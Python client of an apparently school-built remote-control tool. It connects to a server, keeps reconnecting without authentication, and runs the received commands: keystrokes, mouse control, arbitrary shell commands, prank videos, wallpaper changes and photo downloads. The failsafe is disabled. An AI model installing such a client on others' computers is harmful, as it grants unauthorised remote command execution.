import threading
import socket
import time
from os.path import dirname, abspath

from ast import literal_eval
import pyautogui
pyautogui.FAILSAFE = False
father_path = dirname(dirname(abspath(__file__))) # D:\MyDrive\CODING\School Server\Client
father_path = f'{father_path}/Client'
import ctypes
from get_server_info import get_data_of_server

from pynput.mouse import Listener
from functions.show_image import ShowImage
from functions.play_thanos import start
from functions.play_sound import play_sound
from functions.cmd_commands import execute_cmd_command
from Computer_Control import combo_keybinds
from functions.change_background import change_background,download_photos,auto_change_background,change_should_work_auto_change
keyboard_control = False
pressed_buttons = []
from pynput.mouse import Button, Controller

mouse = Controller()

ControlComputer = False

HEADER = 64
FORMAT = 'utf-8'
client,room,name = None,None,None
def connect():
    counter = 0
    global client,room,name
    with open(f'{father_path}/data.txt') as f:
        lines = f.readlines()
        data = lines[0]
        print(data)
        data = data.split(',')

    name = data[2]
    room = data[3]
    data = (data[0],int(data[1]))
    print(data)
    print(data)
    while True:
        try:
            print(f"IN LOOP DATA IS {data}")
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect(data)
            time.sleep(5)
            send()
            if client:
                counter = 0
                break
        except:
            if counter > 5:
                print("TRIED ALREADY 5 TIMES AND CAN't CONNECT!! CHECKING IF MY CRED ARE CORRECT.")
                IP,PORT = get_data_of_server()
                data = IP,PORT
                print(f"NEW DATA IS {data}")
            time.sleep(5)
            print('couldnt')
            counter+=1


def detect_action(wordlist):
        if wordlist[0] == 'write':
            print('yes!!!')
            pyautogui.press(wordlist[1])
            exit()

        if wordlist[0] == 'mousecord':
            cord = literal_eval(wordlist[1])
            pyautogui.moveTo(cord[0], cord[1])
            exit()

        if wordlist[0] == 'scroll':
            mouse.scroll(0,int(wordlist[1]))
            exit()


        if wordlist[0] == 'mouseClick':
            pyautogui.click(button=wordlist[1])
            exit()




        if wordlist[0] == 'cmd':
            execute_cmd_command(wordlist[1])

        if wordlist[0] == 'video':
            threading.Thread(target=start,args=(wordlist[1],)).start()
            threading.Thread(target=play_sound,args=(wordlist[1],)).start()
            time.sleep(15)
            #execute_cmd_command('sleep')
        if wordlist[0] == 'sound':
            threading.Thread(target=play_sound,args=(wordlist[1],)).start()
        if wordlist[0] == 'mouse':
            print(wordlist[1])
            combo_keybinds(wordlist[1])

        if wordlist[0] == 'change background':
            combo_keybinds('desktop')
            time.sleep(1)
            change_background(wordlist[1])
        if wordlist[0] == 'download photo':
            print('ya')
            download_photos(name_of_photo=wordlist[1],link = wordlist[2])

        if wordlist[0] == 'show image':
            ShowImage(wordlist[1])

        if wordlist[0] == 'auto change background':
            sec = int(wordlist[1]) # REPETIOTION OF ACTION I.E EVERY 10 sec to change background
            backgrounds = literal_eval(wordlist[2])
            print(f'SEC IS {sec} AND BACKGROUND IS {backgrounds} TYPE IS {type(backgrounds)}')
            change_should_work_auto_change(start=True)
            auto_change_background(sec=sec,backgrounds = backgrounds)

        if wordlist[0] == 'stop auto change':
            print('YES!!!')
            change_should_work_auto_change(stop=True)
def get_messages():
    print('here')
    while True:
        try:
            message = client.recv(4096).decode(FORMAT)
            word_list = message.split(';')
            print(word_list)
            threading.Thread(target=detect_action,args=(word_list,)).start()
        except:
            print('SERVER WAS CLOSED')
            break

def send():
    room_message =room.encode(FORMAT)
    client.send(room_message)

    name_message = name.encode(FORMAT)
    client.send(name_message)

    """while True:

        msg = input()
        try:
            message = msg.encode(FORMAT)
            client.send(message)
        except ConnectionAbortedError:
            print('[You are not in server] You are no longer in the server.')"""



while True:
    b = threading.Thread(target=connect)
    b.start()
    b.join()
    print('CONNECTD')
    a = threading.Thread(target=get_messages)
    a.start()
    #threading.Thread(target=send).start()
    a.join()

